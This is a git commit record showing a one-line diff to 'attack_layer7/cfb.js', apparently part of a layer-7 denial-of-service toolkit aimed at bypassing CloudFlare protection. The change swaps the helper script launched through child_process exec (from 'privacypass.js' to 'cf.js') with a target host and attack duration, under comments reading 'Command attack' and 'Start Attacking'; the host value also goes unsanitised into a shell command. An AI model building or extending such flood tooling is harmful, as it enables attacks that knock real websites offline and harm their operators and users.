b2a159696424c378dfab7adc3053ba1c06bfb4c1
apaple <76417012+apaple@users.noreply.github.com>
2022-08-25 08:03:24 +0700

    Update cfb.js

--- attack_layer7/cfb.js
+++ attack_layer7/cfb.js
@@ -24,7 +24,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node privacypass.js ${host} ${duration}`, (error, stdout, stderr) => {
+exec(`node cf.js ${host} ${duration}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
